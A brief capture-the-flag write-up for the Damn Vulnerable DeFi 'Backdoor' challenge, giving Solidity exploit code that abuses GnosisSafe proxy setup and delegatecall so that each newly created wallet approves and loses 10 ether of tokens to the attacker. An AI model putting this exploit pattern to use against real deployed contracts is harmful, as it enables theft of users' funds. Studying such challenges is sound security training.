# Backdoor

1. To solve this challenge, you have to understand how proxy and GnosisSafe work. We can abuse the `setup` call when we create the proxy for users by providing a call to malicious contract which call `approve` of token balance to the attacker address. the proxy will call this function use `delegatecall`, thus will approve the token using the proxy context.

```solidity

    function callApprove(address tokenAddr, address attacker) external {
        IERC20(tokenAddr).approve(attacker, 10 ether);
        // token.approve(address(this), 10 ether);
    }

    function callCreate(
        address singleton,
        address registryAddress,
        address[] calldata owners
    ) external {

        bytes memory data = abi.encodeWithSignature(
            "callApprove(address,address)",
            address(token),
            address(this)
        );
        for (uint i; i < owners.length; i++) {
            // address have to be wrapped
            // reference https://github.com/jmhickman/DamnVulnerableDeFi-Solutions/blob/main/Level11-Attack.sol
            address[] memory _target = new address[](1);
            _target[0] = owners[i];
            bytes memory initializer = abi.encodeWithSelector(
                SETUP_SELECTOR,
                _target,
                1,
                address(this),
                data,
                address(0),
                address(0),
                0,
                address(0)
            );
            IProxyCreationCallback callbackRegistry = IProxyCreationCallback(
                registryAddress
            );
            GnosisSafeProxy proxy = proxyFactory.createProxyWithCallback(
                singleton,
                initializer,
                0,
                callbackRegistry
            );
            token.transferFrom(address(proxy), owner, 10 ether);
        }
    }
```
